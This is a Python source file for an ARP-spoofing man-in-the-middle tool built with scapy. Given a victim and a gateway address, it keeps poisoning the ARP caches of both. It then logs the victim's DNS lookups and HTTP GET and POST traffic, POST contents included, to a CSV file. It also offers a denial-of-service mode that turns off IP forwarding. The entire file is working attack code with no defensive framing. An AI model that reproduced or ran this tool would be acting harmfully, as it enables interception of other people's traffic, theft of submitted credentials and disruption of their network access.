# -*- coding: utf-8 -*-s

from scapy.all import *
import threading
import os
import sys
from datetime import datetime
import utils

# gets mac address from ip
def get_MACaddress(ip):
	pack = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
	resp = srp1(pack, verbose=0, timeout=2)
	if resp:
		return resp.hwsrc
	else:
		return None


# victim poisoning, sends ARP packets to victim by faking gateway
def v_poison():
	p = Ether(dst=V_MAC) / ARP(psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
	while True:
		try:
			srp1(p, verbose=0, timeout=1)
		except KeyboardInterrupt:
			sys.exit(1)


# gateway poisoning, sends ARP packets to the gateway by faking victim
def gw_poison():
	p = Ether(dst=GW_MAC) / ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
	while True:
		try:
			srp1(p, verbose=0, timeout=1)
		except KeyboardInterrupt:
			sys.exit(1)


# captures, displays and exentually saves the required traffic of a packet
def sniff_request():
	if SNIFF_SERVICES[SNIFF_SERVICE] == "DNS":
		sniff(iface=INTERFACE, filter="udp port 53", prn=dns_sniff_request)
	elif SNIFF_SERVICES[SNIFF_SERVICE] == "HTTP GET":
		sniff(iface=INTERFACE, filter="tcp port 80", prn=http_sniff_get_request)
	elif SNIFF_SERVICES[SNIFF_SERVICE] == "HTTP POST":
		sniff(iface=INTERFACE, filter="tcp port 80", prn=http_sniff_post_request)
	elif SNIFF_SERVICES[SNIFF_SERVICE] == "ALL AVAILABLE":
		sniff(iface=INTERFACE, filter="tcp port 80 or udp port 53", prn=sniff_all)
	else:
		print("Fatal Error: Missing action!\nAborting...")
		sys.exit(1)


# capture, displays and eventually saves all the services provided by this program from a packet
def sniff_all(pkt):
	# if pkt.haslayer(TCP) and pkt.getlayer(IP).src==V_IP : print(str(pkt.getlayer(TCP)))
	dns_sniff_request(pkt)
	http_sniff_get_request(pkt)
	http_sniff_post_request(pkt)


# captures, displays and eventually saves dns traffic of a packet
def dns_sniff_request(pkt):
	# adding sourcecondition
	try:
		pkt.getlayer(IP).src
		pkt.getlayer(Ether).src
	except AttributeError:
		return
	if (
		pkt.getlayer(IP).src == V_IP
		and pkt.getlayer(Ether).src == V_MAC
		and pkt.haslayer(DNS)
		and pkt.getlayer(DNS).qr == 0
	):
		date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
		print(
			date
			+ " Service: DNS"
			+ " Victim: "
			+ pkt.getlayer(IP).src
			+ " ("
			+ pkt.getlayer(Ether).src
			+ ") is resolving "
			+ pkt.getlayer(DNS).qd.qname
		)
		if not SAVE_FILE_PATH == "":
			utils.save_to_csv_file(
				[
					date,
					pkt.getlayer(IP).src,
					pkt.getlayer(Ether).src,
					"DNS request",
					pkt.getlayer(DNS).qd.qname,
				],
				SAVE_FILE_PATH,
			)


# captures, displays and eventually saves http GET requests
def http_sniff_get_request(pkt):
	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80:
		try:
			# getting GET request and Host header
			raw_content = str(pkt.getlayer(TCP))
			lines = raw_content.split("\r\n")
			get_request = ""
			host_request = ""
			for line in lines:
				if "GET" in line:
					get_line = line.split(" ")
					for index, l in enumerate(get_line):
						if "GET" in l:
							get_request = get_line[index + 1]
				if "Host:" in line:
					host_request = line.split(" ")[1]
					# checking if packet has source fields
			try:
				pkt.getlayer(IP).src
				pkt.getlayer(Ether).src
			except AttributeError:
				return
				# displaying content if GET request is found and if it is from Victim
			if (
				pkt.getlayer(IP).src == V_IP
				and pkt.getlayer(Ether).src == V_MAC
				and not get_request == ""
			):
				date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
				print(
					date
					+ " Service: HTTP_GET"
					+ " Victim: "
					+ pkt.getlayer(IP).src
					+ " ("
					+ pkt.getlayer(Ether).src
					+ ") is requiring document: "
					+ host_request
					+ get_request
				)
				if not SAVE_FILE_PATH == "":
					utils.save_to_csv_file(
						[
							date,
							pkt.getlayer(IP).src,
							pkt.getlayer(Ether).src,
							"HTTP_GET request",
							host_request + get_request,
						],
						SAVE_FILE_PATH,
					)
		except IndexError:
			return


# captures, displays and eventually saves http POST requests
def http_sniff_post_request(pkt):
	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80:
		try:
			# getting GET request and Host header
			raw_content = str(pkt.getlayer(TCP))
			lines = raw_content.split("\r\n")
			post_request = ""
			host_request = ""
			found_first_empty_line = False
			post_content = ""
			for index, line in enumerate(lines):
				if "POST" in line:
					post_line = line.split(" ")
					for index1, l in enumerate(post_line):
						if "POST" in l:
							post_request = post_line[index1 + 1]
				if "Host:" in line:
					host_request = line.split(" ")[1]
				if line == "" and found_first_empty_line == False:
					found_first_empty_line = True
					post_content = lines[index + 1]
					# checking if packet has source fields
			try:
				pkt.getlayer(IP).src
				pkt.getlayer(Ether).src
			except AttributeError:
				return
				# displaying content if GET request is found and if it is from Victim
			if (
				pkt.getlayer(IP).src == V_IP
				and pkt.getlayer(Ether).src == V_MAC
				and not post_request == ""
			):
				date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
				print(
					date
					+ " Service: HTTP_POST"
					+ " Victim: "
					+ pkt.getlayer(IP).src
					+ " ("
					+ pkt.getlayer(Ether).src
					+ ")"
					+ " is sending document: "
					+ host_request
					+ post_request
					+ " Content:"
					+ post_content
				)
				if not SAVE_FILE_PATH == "":
					utils.save_to_csv_file(
						[
							date,
							pkt.getlayer(IP).src,
							pkt.getlayer(Ether).src,
							"HTTP_POST request",
							(
								"POST location:"
								+ host_request
								+ post_request
								+ " Content:"
								+ post_content
							),
						],
						SAVE_FILE_PATH,
					)
		except IndexError:
			return


# presentation
utils.program_header(["ARP spoofing MITM", "Version: 0.3", "Author: Carlo Cervellin"])

# constants
ATTACK_TYPE_SNIFF = 0
ATTACK_TYPE_DOS = 1

SNIFF_SERVICES = ["ALL AVAILABLE", "HTTP GET", "HTTP POST", "DNS"]  # 0  # 1  # 2  # 3

DEFAULT_GATEWAY_IP = "192.168.0.1"
DEFAULT_INTERFACE = "wlan0"

# receiving user input
print("\n" + "=" * 20 + " TARGETS DEFINITION " + "=" * 20)
V_IP = raw_input("Insert the IP address to attack: ")
GW_IP = raw_input(
	'Insert the gateway IP address [default "' + DEFAULT_GATEWAY_IP + '"]: '
)
INTERFACE = raw_input(
	'Insert the network interface name [default "' + DEFAULT_INTERFACE + '"]: '
)
print("=" * 20 + " ATTACK TYPE DEFINITION " + "=" * 20)
ATTACK_TYPE = 0
ATTACK_TYPE_INPUT = raw_input(
	"Choose tattack type:\n" + "\t[0, empty, invalid] SNIFF\n" + "\t[1] DOS\n"
)
try:
	ATTACK_TYPE = int(ATTACK_TYPE_INPUT)
except ValueError:
	pass

SNIFF_SERVICE = 0
SAVE_FILE_PATH = ""
if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
	SNIFF_SERVICE_INPUT = raw_input(
		"Choose tattack type:\n"
		+ "\t[0, empty, invalid] ALL AVAILABLE\n"
		+ "\t[1] HTTP GET\n"
		+ "\t[2] HTTP POST\n"
		+ "\t[3] DNS\n"
	)
	try:
		SNIFF_SERVICE = int(SNIFF_SERVICE_INPUT)
	except ValueError:
		pass
	SAVE_FILE_PATH = raw_input(
		"Save output file name or path (output file is a csv file) [empty means no saving file]: "
	)

# checking user ip target and network interface and setting default in case missing
if GW_IP is None or GW_IP == "":
	GW_IP = DEFAULT_GATEWAY_IP
if INTERFACE is None or INTERFACE == "":
	INTERFACE = DEFAULT_INTERFACE

# print a final resume of user input variables
if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
	SERVICE_STRING = SNIFF_SERVICES[0]
	try:
		SERVICE_STRING = SNIFF_SERVICES[SNIFF_SERVICE]
	except IndexError:
		pass
	print(
		"ATTACK RESUME: sniffing "
		+ V_IP
		+ " "
		+ SERVICE_STRING
		+ " traffic with gateway "
		+ GW_IP
		+ " from network interface "
		+ INTERFACE
		+ ""
	)
	_SAVE_FILE_ABSOLUTE_PATH = os.path.abspath(SAVE_FILE_PATH)
	if not SAVE_FILE_PATH == "":
		print("Saving output to file: " + _SAVE_FILE_ABSOLUTE_PATH)
elif ATTACK_TYPE == ATTACK_TYPE_DOS:
	print(
		"ATTACK RESUME: denying services for "
		+ V_IP
		+ " with gateway "
		+ GW_IP
		+ " from network interface "
		+ INTERFACE
	)
else:
	print("Fatal Error, ATTACK_TYPE not defined\nAborting...")
	sys.exit(1)
print("Type anything to start the attack:")
raw_input()

# getting victim and gateway mac address by iterating research until both are found
print("Obtaining MAC addresses (may take a few attempts)...")
while True:
	V_MAC = get_MACaddress(V_IP)
	GW_MAC = get_MACaddress(GW_IP)
	if V_MAC is None:
		print("Cannot find victim MAC address (" + V_IP + "), retrying...")
	elif GW_MAC is None:
		print("Cannot find victim MAC address (" + GW_IP + "), retrying...")
	else:
		break
print("Attack targets have been found!")

# showing ARP spoofing targets
print("Victim: " + V_IP + " (" + V_MAC + ")")
print("Gateway: " + GW_IP + " (" + GW_MAC + ")")
print("Poisoning victim and gateway...")

# enable or disable IP forwarding
if ATTACK_TYPE == ATTACK_TYPE_DOS:
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
else:
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

vthread = []
gwthread = []

if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
	print("Showing sniffed traffic...")
elif ATTACK_TYPE == ATTACK_TYPE_DOS:
	print("DOS attack in action...")
print("INFO: Stop script by pressing the interrupt key combination CTRL+C")

# main program loop
while True:
	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()

	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	gwpoison.start()

	if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
		sniff_request()
